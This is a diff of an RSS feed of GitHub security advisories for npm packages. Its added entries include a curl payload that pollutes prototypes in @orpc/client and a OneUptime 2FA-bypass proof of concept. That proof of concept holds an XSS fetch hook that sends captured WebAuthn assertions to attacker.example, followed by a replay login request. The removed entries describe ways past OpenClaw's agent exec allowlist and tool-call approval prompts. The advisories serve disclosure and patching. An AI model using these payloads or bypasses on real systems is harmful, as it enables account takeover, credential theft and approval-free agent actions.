@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-03-02T21:04:22.723Z</updated>
+    <updated>2026-03-02T21:46:48.810Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,236 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@orpc/client] `@orpc/client` has Prototype Pollution via `StandardRPCJsonSerializer` Deserialization]]></title>
+        <id>https://github.com/advisories/GHSA-m272-9rp6-32mc</id>
+        <link href="https://github.com/advisories/GHSA-m272-9rp6-32mc"/>
+        <updated>2026-03-02T21:43:04.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A critical Prototype Pollution vulnerability exists in the RPC JSON deserializer of the <code>@orpc/client</code> package. The vulnerability allows unauthenticated, remote attackers to inject arbitrary properties into the global <code>Object.prototype</code>. Because this pollution persists for the lifetime of the Node.js process and affects all objects, it can lead to severe security breaches, including authentication bypass, denial of service, and potentially Remote Code Execution.</p>
+<h3 id="vulnerability-details">Vulnerability Details</h3>
+<p>The root cause lies in the <code>deserialize()</code> method of <code>StandardRPCJsonSerializer</code>. When processing attacker-controlled path segments from the <code>meta</code> and <code>maps</code> arrays, the deserializer fails to implement validation or sanitization for dangerous JavaScript object keys, specifically <code>__proto__</code> and <code>constructor</code>:</p>
+<p><a href="https://github.com/middleapi/orpc/blob/819ed2e0897b18a5d6a4ca85ba68568f055004a1/packages/client/src/adapters/standard/rpc-json-serializer.ts#L137-L213">https://github.com/middleapi/orpc/blob/819ed2e0897b18a5d6a4ca85ba68568f055004a1/packages/client/src/adapters/standard/rpc-json-serializer.ts#L137-L213</a></p>
+<p>There are two primary distinct write vectors available to an attacker:</p>
+<ol>
+<li>The <code>meta</code> vector: Writes type-constrained values (e.g., <code>Map</code>, <code>Set</code>, <code>Date</code>) to arbitrary object paths.</li>
+<li>The <code>maps</code> vector: Allows the injection of arbitrary string values. This occurs because the return value of <code>getBlob(i)</code> (which relies on <code>FormData.get(i.toString())</code>) is cast <code>as Blob</code>. Since this is strictly a TypeScript compile-time cast, the runtime execution allows standard text fields to return as arbitrary strings.</li>
+</ol>
+<p>Crucially, this deserialization process occurs at the very beginning of the request lifecycle before any Zod schema validation takes place. Consequently, a malicious payload will successfully pollute the prototype even if the request is subsequently rejected by the validation layer.</p>
+<p>This issue impacts all server adapters utilizing the RPC protocol.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p>To reproduce the vulnerability, set up the <a href="https://github.com/middleapi/orpc/tree/main/playgrounds/astro">playgrounds/astro</a> environment and start the development server using <code>pnpm dev</code>. </p>
+<p>Run the following <code>curl</code> command to send a crafted payload:</p>
+<pre><code class="language-bash">curl -X POST http://localhost:4321/rpc/planet/create \
+     -F 'data={"json":{},"meta":[],"maps":[["__proto__","role"]]}' \
+     -F '0=admin'
+</code></pre>
+<p>Result: The deserializer evaluates <code>maps</code>, follows the <code>__proto__</code> path, and maps index <code>0</code> to the string <code>"admin"</code>. This immediately applies <code>Object.prototype.role = "admin"</code> across the entire Node.js server instance. </p>
+<h3 id="impact">Impact</h3>
+<p>Servers relying on <code>StandardRPCJsonSerializer</code> for deserialization are immediately susceptible to global prototype pollution. The potential impacts including:</p>
+<ul>
+<li>Privilege Escalation / Authorization Bypass: Attackers can bypass flawed security checks. For example, if the server relies on a defaulted property check like <code>if (user.role === "admin")</code>, the application will evaluate this as <code>true</code> for all users globally.</li>
+<li>Remote Code Execution: If the application or its dependencies contain susceptible prototype pollution gadgets (e.g., dynamically executing shell commands or scripts based on object properties), this vulnerability can be leveraged into full RCE.</li>
+<li>Denial of Service: Attackers can overwrite built-in methods (e.g., <code>toString</code>) or set objects into unexpected states, causing the application to crash or throw unhandled exceptions globally.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/middleapi/orpc/security/advisories/GHSA-m272-9rp6-32mc">https://github.com/middleapi/orpc/security/advisories/GHSA-m272-9rp6-32mc</a></li>
+<li><a href="https://github.com/middleapi/orpc/commit/1dba06fc6f938c2486de303c2fa096bc1c8418b5">https://github.com/middleapi/orpc/commit/1dba06fc6f938c2486de303c2fa096bc1c8418b5</a></li>
+<li><a href="https://github.com/advisories/GHSA-m272-9rp6-32mc">https://github.com/advisories/GHSA-m272-9rp6-32mc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m272-9rp6-32mc</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-02T21:43:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@builder.io/qwik] Qwik vulnerable to Unauthenticated RCE via server$ Deserialization]]></title>
+        <id>https://github.com/advisories/GHSA-p9x5-jp3h-96mm</id>
+        <link href="https://github.com/advisories/GHSA-p9x5-jp3h-96mm"/>
+        <updated>2026-03-02T21:41:19.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>qwik &lt;=1.19.0 is vulnerable to RCE due to an unsafe deserialization vulnerability in the <code>server$</code> RPC mechanism that allows any unauthenticated user to execute arbitrary code on the server with a single HTTP request. Affects any deployment where <code>require()</code> is available at runtime.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Remote Code Execution</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/QwikDev/qwik/security/advisories/GHSA-p9x5-jp3h-96mm">https://github.com/QwikDev/qwik/security/advisories/GHSA-p9x5-jp3h-96mm</a></li>
+<li><a href="https://github.com/QwikDev/qwik/releases/tag/%40builder.io%2Fqwik%401.19.1">https://github.com/QwikDev/qwik/releases/tag/%40builder.io%2Fqwik%401.19.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-p9x5-jp3h-96mm">https://github.com/advisories/GHSA-p9x5-jp3h-96mm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p9x5-jp3h-96mm</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-02T21:41:18.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@oneuptime/common] OneUptime has WebAuthn 2FA bypass: server accepts client-supplied challenge instead of server-stored value, allowing credential replay]]></title>
+        <id>https://github.com/advisories/GHSA-gjjc-pcwp-c74m</id>
+        <link href="https://github.com/advisories/GHSA-gjjc-pcwp-c74m"/>
+        <updated>2026-03-02T21:40:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The WebAuthn authentication implementation does not store the challenge on the server side. Instead, the challenge is returned to the client and accepted back from the client request body during verification. This violates the WebAuthn specification (<a href="https://www.w3.org/TR/webauthn-2/#sctn-cryptographic-challenges">W3C Web Authentication Level 2, §13.4.3</a>) and allows an attacker who has obtained a valid WebAuthn assertion (e.g., via XSS, MitM, or log exposure) to replay it indefinitely, completely bypassing the second-factor authentication.</p>
+<h3 id="details">Details</h3>
+<p>During WebAuthn authentication, the server generates a random challenge via <code>generateAuthenticationOptions()</code> in <code>Common/Server/Services/UserWebAuthnService.ts</code> (line 164-221). However, the challenge is <strong>only returned to the client</strong> and <strong>never stored in a session or database</strong> on the server side.</p>
+<p>When the client submits the authentication response, the server reads the <code>expectedChallenge</code> directly from the untrusted request body (<code>Authentication.ts:1042</code>):</p>
+<pre><code class="language-typescript">// App/FeatureSet/Identity/API/Authentication.ts:1041-1049
+} else if (verifyWebAuthn) {
+  const expectedChallenge: string = data["challenge"] as string;  // ← client-controlled
+  const credential: any = data["credential"];
+
+  await UserWebAuthnService.verifyAuthentication({
+    userId: alreadySavedUser.id!.toString(),
+    challenge: expectedChallenge,  // ← NOT a server-stored value
+    credential: credential,
+  });
+}
+</code></pre>
+<p>The <code>verifyAuthentication()</code> method then passes this client-provided challenge to <code>@simplewebauthn/server</code>'s <code>verifyAuthenticationResponse()</code> as <code>expectedChallenge</code> (<code>UserWebAuthnService.ts:268-270</code>):</p>
+<pre><code class="language-typescript">const verification: any = await verifyAuthenticationResponse({
+  response: data.credential,
+  expectedChallenge: data.challenge,  // ← client-controlled value used as "expected"
+  expectedOrigin: expectedOrigin,
+  expectedRPID: Host.toString(),
+  credential: { /* public key from DB */ },
+});
+</code></pre>
+<p>Since both the <code>expectedChallenge</code> (from request body) and the challenge embedded in the credential's <code>clientDataJSON</code> originate from the same captured assertion, they will always match. The cryptographic signature also remains valid because it was signed by the legitimate user's authenticator.</p>
+<p><strong>Correct flow vs. OneUptime's flow:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Correct WebAuthn</th>
+<th>OneUptime</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1. Generate challenge</td>
+<td>Server generates random challenge</td>
+<td>Same</td>
+</tr>
+<tr>
+<td>2. Store challenge</td>
+<td><strong>Saved in session/DB</strong></td>
+<td><strong>Not saved anywhere</strong></td>
+</tr>
+<tr>
+<td>3. Send to client</td>
+<td>Sent to client</td>
+<td>Same</td>
+</tr>
+<tr>
+<td>4. Authenticator signs</td>
+<td>Authenticator signs challenge</td>
+<td>Same</td>
+</tr>
+<tr>
+<td>5. Client returns</td>
+<td>Returns signed credential</td>
+<td>Returns credential <strong>+ challenge</strong></td>
+</tr>
+<tr>
+<td>6. Verify</td>
+<td>Compares against <strong>server-stored</strong> value</td>
+<td>Compares against <strong>client-provided</strong> value</td>
+</tr>
+<tr>
+<td>Result</td>
+<td>Replay-proof</td>
+<td><strong>Replayable</strong></td>
+</tr>
+</tbody></table>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong></p>
+<ul>
+<li>An attacker has obtained the victim's password (e.g., credential stuffing, phishing)</li>
+<li>An attacker has captured a valid WebAuthn assertion from the victim (e.g., via XSS on a OneUptime page, network interception, or log leakage)</li>
+</ul>
+<p><strong>Steps to reproduce:</strong></p>
+<ol>
+<li><p><strong>Capture a valid WebAuthn assertion.</strong>
+Intercept or extract a legitimate authentication request containing <code>challenge</code> and <code>credential</code> fields. For example, by injecting JavaScript via stored XSS in a Mermaid diagram on a status page (related vulnerability):</p>
+<pre><code class="language-javascript">// XSS payload to intercept WebAuthn authentication
+const origFetch = window.fetch;
+window.fetch = async function(url, opts) {
+  if (url.includes('/verify') &amp;&amp; opts?.body) {
+    const body = JSON.parse(opts.body);
+    if (body.data?.credential) {
+      // Exfiltrate the assertion
+      navigator.sendBeacon('https://attacker.example/collect', JSON.stringify({
+        challenge: body.data.challenge,
+        credential: body.data.credential
+      }));
+    }
+  }
+  return origFetch.apply(this, arguments);
+};
+</code></pre>
+</li>
+<li><p><strong>Replay the captured assertion at any later time.</strong>
+Send the following request with the victim's email, password, and the captured challenge + credential:</p>
+<pre><code class="language-http">POST /api/identity/authentication/login HTTP/1.1
+Content-Type: application/json
+
+{
+  "data": {
+    "email": "victim@example.com",
+    "password": "&lt;victim's password&gt;",
+    "challenge": "&lt;captured challenge value&gt;",
+    "credential": {
+      "id": "&lt;captured credential id&gt;",
+      "rawId": "&lt;captured rawId&gt;",
+      "response": {
+        "authenticatorData": "&lt;captured authenticatorData&gt;",
+        "clientDataJSON": "&lt;captured clientDataJSON&gt;",
+        "signature": "&lt;captured signature&gt;"
+      },
+      "type": "public-key",
+      "clientExtensionResults": {},
+      "authenticatorAttachment": "platform"
+    }
+  }
+}
+</code></pre>
+</li>
+<li><p><strong>Result:</strong> The server accepts the authentication. The <code>expectedChallenge</code> (from the request body) matches the challenge in <code>clientDataJSON</code> (from the same captured assertion), and the signature is valid (signed by the real user's key). A session token is returned, granting full access to the victim's account.</p>
+<p>The attacker bypasses WebAuthn 2FA without possessing the victim's authenticator device.</p>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p><strong>WebAuthn 2FA is rendered ineffective.</strong> The entire purpose of WebAuthn as a second factor is to protect accounts when passwords are compromised. This vulnerability means that once an attacker has both the password and a single captured assertion, they can authenticate as the victim indefinitely — the assertion never expires because there is no server-side challenge state to invalidate.</p>
+<p><strong>Who is impacted:</strong> Any OneUptime user who has enrolled WebAuthn/Passkey as their second factor. The 2FA protection they rely on provides no meaningful security against an attacker who has obtained their password and intercepted one authentication exchange.</p>
+<p><strong>Attack chain potential:</strong> This vulnerability can be chained with:</p>
+<ul>
+<li>Stored XSS (e.g., via Mermaid rendering in status pages) to capture assertions</li>
+<li>Absence of rate limiting on authentication endpoints to obtain passwords via credential stuffing</li>
+<li>User enumeration via differential error messages to identify valid targets</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/OneUptime/oneuptime/security/advisories/GHSA-gjjc-pcwp-c74m">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-gjjc-pcwp-c74m</a></li>
+<li><a href="https://github.com/advisories/GHSA-gjjc-pcwp-c74m">https://github.com/advisories/GHSA-gjjc-pcwp-c74m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gjjc-pcwp-c74m</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-02T21:40:54.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[nocodb] NocoDB Missing Ownership Validation in MCP Token Operations]]></title>
         <id>https://github.com/advisories/GHSA-p9x3-w98f-7j3q</id>
@@ -599,106 +829,5 @@ const output = serialize({ re: rceRegex });
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-02-28T02:47:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw is vulnerable to validation bypass through GNU long-option abbreviations in allowlist mode]]></title>
-        <id>https://github.com/advisories/GHSA-7977-c43c-xpwj</id>
-        <link href="https://github.com/advisories/GHSA-7977-c43c-xpwj"/>
-        <updated>2026-02-28T02:17:26.000Z</updated>
-        <content type="html"><![CDATA[<p>In OpenClaw before 2026.2.23, tools.exec.safeBins validation for sort could be bypassed via GNU long-option abbreviations (such as --compress-prog) in allowlist mode, leading to approval-free execution paths that were intended to require approval. Only an exact string such as --compress-program was denied.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-3c6h-g97w-fg78">https://github.com/openclaw/openclaw/security/advisories/GHSA-3c6h-g97w-fg78</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28363">https://nvd.nist.gov/vuln/detail/CVE-2026-28363</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/3b8e33037ae2e12af7beb56fcf0346f1f8cbde6f">https://github.com/openclaw/openclaw/commit/3b8e33037ae2e12af7beb56fcf0346f1f8cbde6f</a></li>
-<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.2.23">https://github.com/openclaw/openclaw/releases/tag/v2026.2.23</a></li>
-<li><a href="https://github.com/advisories/GHSA-7977-c43c-xpwj">https://github.com/advisories/GHSA-7977-c43c-xpwj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7977-c43c-xpwj</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-02-27T06:31:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@sveltejs/kit] SvelteKit  has deserialization expansion in unvalidated `form` remote function leading to Denial of Service (experimental only)]]></title>
-        <id>https://github.com/advisories/GHSA-fpg4-jhqr-589c</id>
-        <link href="https://github.com/advisories/GHSA-fpg4-jhqr-589c"/>
-        <updated>2026-02-28T02:04:40.000Z</updated>
-        <content type="html"><![CDATA[<p>Some relatively small inputs can cause very large files arrays in <code>form</code> handlers. If the SvelteKit application code doesn't check <code>files.length</code> or individual files' sizes and performs expensive processing with them, it can result in Denial of Service.</p>
-<p>Only users with <code>experimental.remoteFunctions: true</code> who are using the <code>form</code> function and are processing the <code>files</code> array without validation are vulnerable.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-fpg4-jhqr-589c">https://github.com/sveltejs/kit/security/advisories/GHSA-fpg4-jhqr-589c</a></li>
-<li><a href="https://github.com/sveltejs/kit/commit/faba869db3644077169bf5d7c6e41fd5f3d6c65e">https://github.com/sveltejs/kit/commit/faba869db3644077169bf5d7c6e41fd5f3d6c65e</a></li>
-<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@2.53.3">https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@2.53.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-fpg4-jhqr-589c">https://github.com/advisories/GHSA-fpg4-jhqr-589c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fpg4-jhqr-589c</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-02-28T02:04:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw ACP client has permission auto-approval bypass via untrusted tool metadata]]></title>
-        <id>https://github.com/advisories/GHSA-7jx5-9fjg-hp4m</id>
-        <link href="https://github.com/advisories/GHSA-7jx5-9fjg-hp4m"/>
-        <updated>2026-02-27T22:08:37.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="vulnerability-summary">Vulnerability Summary</h2>
-<p>The OpenClaw ACP client could auto-approve tool calls based on untrusted metadata and permissive name heuristics. A malicious or compromised ACP tool invocation could bypass expected interactive approval prompts for read-class operations.</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: npm <code>openclaw</code></li>
-<li>Affected published versions: <code>&lt;= 2026.2.22-2</code> (latest published as of February 24, 2026 is <code>2026.2.22-2</code>)</li>
-<li>Patched in code on <code>main</code>: <code>2026.2.23</code> (released)</li>
-</ul>
-<h2 id="technical-details">Technical Details</h2>
-<ul>
-<li>Permission classification trusted incoming <code>toolCall.kind</code> and heuristic name matching.</li>
-<li>Non-core read-like names and spoofed kind metadata could reach auto-approve paths.</li>
-<li><code>read</code> operations were not scoped strongly enough to cwd in all metadata/title forms.</li>
-</ul>
-<h2 id="fix">Fix</h2>
-<ul>
-<li>Require trusted core tool IDs for auto-approval and ignore untrusted <code>toolCall.kind</code> as an authorization source.</li>
-<li>Scope <code>read</code> auto-approval to cwd-resolved paths.</li>
-<li>Add stricter tool-name validation and regression coverage for spoofed kind and non-core read-like names.</li>
-</ul>
-<h2 id="affected-functions">Affected Functions</h2>
-<ul>
-<li><code>resolvePermissionRequest</code></li>
-<li><code>resolveToolNameForPermission</code></li>
-<li><code>shouldAutoApproveToolCall</code></li>
-</ul>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>12cc754332f9a7c92e158ce7644aa22df79c0904</code></li>
-<li><code>63dcd28ae0be2de1c75af09cc81841cebeec068f</code></li>
-</ul>
-<p>Found using <a href="https://github.com/Pigyon/MCPwner">MCPwner</a></p>
-<p>Thanks @nedlir for reporting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-7jx5-9fjg-hp4m">https://github.com/openclaw/openclaw/security/advisories/GHSA-7jx5-9fjg-hp4m</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/12cc754332f9a7c92e158ce7644aa22df79c0904">https://github.com/openclaw/openclaw/commit/12cc754332f9a7c92e158ce7644aa22df79c0904</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/63dcd28ae0be2de1c75af09cc81841cebeec068f">https://github.com/openclaw/openclaw/commit/63dcd28ae0be2de1c75af09cc81841cebeec068f</a></li>
-<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.2.23">https://github.com/openclaw/openclaw/releases/tag/v2026.2.23</a></li>
-<li><a href="https://github.com/advisories/GHSA-7jx5-9fjg-hp4m">https://github.com/advisories/GHSA-7jx5-9fjg-hp4m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7jx5-9fjg-hp4m</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-02-27T22:08:36.000Z</published>
     </entry>
 </feed>
